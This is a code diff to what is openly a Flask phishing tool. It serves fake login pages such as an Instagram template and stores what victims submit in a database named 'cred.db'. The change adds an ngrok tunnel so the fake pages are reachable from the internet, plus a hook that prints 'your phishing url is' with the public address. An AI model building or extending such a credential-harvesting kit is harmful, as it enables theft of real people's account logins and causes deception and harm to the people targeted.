@@ -1,13 +1,17 @@
 from flask import Flask, render_template, request
 from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy import Column, String, Integer
+from flask_ngrok3 import run_with_ngrok, get_host
 
 from argparse import ArgumentParser
+
+import os
 
 app = Flask(__name__, template_folder="templates", static_folder='static', static_url_path='/static')
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///cred.db'
 
 db = SQLAlchemy(app)
+run_with_ngrok(app)
 
 selected_template = None
 
@@ -28,6 +32,11 @@ def fake_page():
     else:
         pass
     return render_template(f"{selected_template}"+".html")
+
+def ngrok_url():
+    print(f"your phishing url is {get_host()}")
+
+app.before_request(ngrok_url)
 
 if __name__ == "__main__":
     with app.app_context():
@@ -56,7 +65,7 @@ if __name__ == "__main__":
         elif (args.select == 'instagram'):
             selected_template = 'instagram'
 
-        app.run(debug=True)
+        app.run(debug=False)
     
 
     #app.run(debug=True)
